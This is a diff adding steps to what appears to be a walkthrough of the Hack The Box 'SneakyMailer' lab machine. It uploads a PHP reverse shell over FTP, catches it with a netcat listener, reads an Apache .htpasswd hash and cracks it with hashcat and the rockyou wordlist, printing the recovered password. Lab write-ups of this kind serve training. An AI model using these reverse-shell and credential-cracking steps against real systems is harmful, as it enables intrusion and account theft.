@@ -154,3 +154,29 @@ wfuzz -c -f subdomainSneakyMailer.log -w /usr/share/seclists/Discovery/DNS/subdo
 
 ```
 u will find the dev subdowmain check the logs in subdomainSneakyMailer.log 
+
+now change the /etc/hosts files and put the subdomain and remove the previous entry meaning now ur hosts file must contains:
+``` 10.10.10.197 dev.sneakycorp.htb
+```
+once updated put the reverseshell.php using ftp
+
+use nc to open the port listening via ```nc -vlp 1234 ```
+now go to the link on browser that is ```dev.sneakycorp.htb/reverseshell.php```
+ ur netcat will give u a shell for www-data, with that go to ```/var/www/pypi.sneakycorp.htb```
+u will find a ".htpasswd" file there with the following content ```pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
+```
+on identifying the hash using hashid tool we find the following: 
+``` hashid -m '$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/'
+Analyzing '$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/'                                                                                                                                                                                          
+[+] MD5(APR) [Hashcat Mode: 1600]                                                                                                                                                                                                          
+[+] Apache MD5 [Hashcat Mode: 1600]
+```
+PS: -m is for the output of hashcat
+on using rockyou wordlist  with hashcat we find the following:
+```
+hashcat -m 1600 -a 0 --force -o cracked.txt target_hashes.txt /usr/share/wordlists/rockyou.txt
+User: $apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui
+password: soufianeelhaoui
+```
+
+
